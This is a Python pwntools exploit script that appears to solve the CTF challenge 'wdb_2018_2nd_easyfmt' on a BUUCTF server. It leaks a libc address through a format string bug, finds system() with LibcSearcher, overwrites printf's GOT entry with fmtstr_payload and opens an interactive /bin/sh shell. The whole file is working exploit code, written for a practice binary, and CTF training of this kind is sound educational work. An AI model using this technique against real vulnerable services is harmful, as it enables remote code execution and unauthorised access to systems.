from pwn import *
context.log_level = 'debug'
context.arch = 'i386'
context.terminal = ['tmux', 'splitw', '-h']

host = 'node4.buuoj.cn'
port = 25444
elfpath = './wdb_2018_2nd_easyfmt'
libcpath = ''

if args.LOCAL:
    p = process([elfpath])
    # gdb.attach(p)
else:
    p = remote(host, port)
    
s = lambda content: p.send(content)
sl = lambda content: p.sendline(content)
r = lambda n: p.recv(n)
ru = lambda pattern: p.recvuntil(pattern)
rl = lambda: p.recvline()
ru7f = lambda: p.recvuntil(b'\x7f')
su = lambda x: p.success(x)
shell = lambda: p.interactive()

# start pwning
'''
格式化字符串泄露 __libc_start_main+247，然后改写main返回地址，getshell
'''
e = ELF(elfpath)

ru(b'Do you know repeater?\n')
sl(b'%35$p.')
# sl(p32(e.got['printf']) +b'%6$s')
libc_start_main = int(r(10).decode(), 16) - 247
# ru(p32(e.got['printf']))
# printf_addr = u32(r(4))
# su(f"printf addr: {hex(printf_addr)}")
from LibcSearcher import *
libc = LibcSearcher('__libc_start_main', libc_start_main)
system_addr = libc.dump('system') + libc_start_main - libc.dump('__libc_start_main')
binsh_addr = libc.dump('str_bin_sh') + libc_start_main - libc.dump('__libc_start_main')

# libc = ELF('/home/leo/ctfs/ctfoj/BUUCTF/Pwn/libcs/ubuntu16/x86/libc-2.23.so')
# su(hex(libc.sym['printf']))
# libc_base = printf_addr - libc.sym['printf'] # 0x054020 # 0x4a020
# system_addr = libc_base + libc.sym['system'] # 0x045000 # 0x03be50
# su(f"libc base: {hex(libc_base)}\nsystem: {hex(system_addr)}")
# libc = LibcSearcher('printf', printf_addr)
# system_addr = libc.dump('system') + printf_addr - libc.dump('printf')
# binsh_addr = libc.dump('str_bin_sh') + printf_addr - libc.dump('printf')

payload2 = fmtstr_payload(offset=6, writes = {e.got['printf']: system_addr}, write_size='byte')
sl(payload2)
s(b'/bin/sh\x00')
shell()

